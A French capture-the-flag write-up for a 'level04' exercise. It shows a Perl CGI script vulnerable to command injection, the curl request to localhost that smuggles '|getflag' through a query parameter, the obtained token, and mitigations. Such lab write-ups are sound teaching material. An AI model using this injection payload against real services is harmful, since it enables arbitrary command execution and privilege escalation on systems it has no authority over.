# Level04 — Explications

## Objectif
Exécuter `getflag` avec les droits de `flag04` pour obtenir le token qui sert
de mot de passe à `level05`.

## La faille
`level04.pl` est un script CGI Perl, SUID `flag04` :
```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x"));
```
La valeur du paramètre `x` est injectée **sans filtrage** dans une commande
shell exécutée via des backticks : injection de commande classique.

Problème : exécuté directement (`./level04.pl`), le bit SUID est **ignoré**
par le noyau (comportement volontaire de Linux sur les scripts interprétés),
donc l'injection ne tourne qu'avec les droits de `level04`. Le commentaire
`# localhost:4747` indique qu'un vrai service écoute sur ce port — confirmé
par `netstat -a` (`tcp6 ... :4747 ... LISTEN`). C'est ce service (lancé avec
les droits de `flag04`) qu'il faut exploiter, pas le script en local.

## Exploitation
```bash
curl "http://localhost:4747/level04.pl?x=bonjour|getflag"
# Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```
(`|` passe inaperçu du parsing de la query string par `CGI.pm`, contrairement
à `;` ou `&`, qui sont des séparateurs de paramètres et coupent l'injection
avant qu'elle n'atteigne le shell.)

Token obtenu : `ne2searoevaevoem4ov4ar8ap` — flag de level04 et mot de passe
de level05.

## Analyse de la faille

**Quelle était la faille ?**
Une double faille :
1. **Injection de commande** : le script construit une commande shell en y
   concaténant directement une entrée utilisateur (`$y`), sans aucune
   validation ni échappement des caractères spéciaux.
2. **Service exposé avec privilèges élevés** : un serveur web local exécute
   ce script avec les droits de `flag04`, rendant la faille d'injection
   exploitable pour une élévation de privilèges réelle (alors qu'en exécution
   locale directe, le bit SUID du script est ignoré par le noyau).

**Pourquoi c'est un problème ?**
- Construire une commande shell à partir d'une entrée utilisateur permet à
  quiconque d'exécuter **n'importe quelle commande arbitraire**, avec les
  droits du processus qui l'exécute.
- Combiné à un service tournant avec des privilèges élevés, cette faille
  devient une élévation de privilèges triviale pour n'importe qui pouvant
  atteindre le port exposé.

**Comment l'empêcher ?**
- Ne jamais construire de commande shell à partir d'une entrée utilisateur.
  Utiliser des fonctions qui exécutent un programme avec une liste
  d'arguments séparée (ex: `system(LIST)` en Perl, pas `system(STRING)`),
  sans passer par un shell intermédiaire.
- Valider/filtrer strictement les entrées utilisateur (liste blanche de
  caractères autorisés).
- Appliquer le principe du moindre privilège : un service exposé sur le
  réseau ne devrait jamais tourner avec plus de droits que nécessaire.
